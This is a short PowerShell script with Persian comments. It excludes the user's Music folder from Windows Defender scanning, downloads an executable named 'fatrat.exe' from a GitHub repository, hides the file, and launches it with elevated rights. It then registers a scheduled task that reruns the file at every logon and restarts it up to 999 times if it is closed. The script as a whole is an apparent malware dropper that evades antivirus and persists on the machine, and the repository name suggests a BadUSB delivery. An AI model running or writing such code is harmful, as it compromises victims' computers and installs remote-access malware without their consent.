Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"
$dest = "$env:USERPROFILE\Music\fatrat.exe"

Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path $dest -Name Attributes -Value Hidden

Start-Process -FilePath $dest -Verb RunAs   



# مسیر فایل exe در فولدر Music یوزر
$exePath = Join-Path $env:USERPROFILE "Music\fatrat.exe"

# اکشن اجرای برنامه
$action = New-ScheduledTaskAction -Execute $exePath

# تریگر اجرا در هر Logon
$trigger = New-ScheduledTaskTrigger -AtLogOn

# تنظیمات ری‌استارت در صورت بسته شدن برنامه
$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Seconds 20)

# ساخت یا آپدیت تسک
Register-ScheduledTask -TaskName "MyAppAutoRun" -Action $action -Trigger $trigger -Settings $settings -Force -Description "Auto-run app from Music folder on every logon with restart if closed"


    
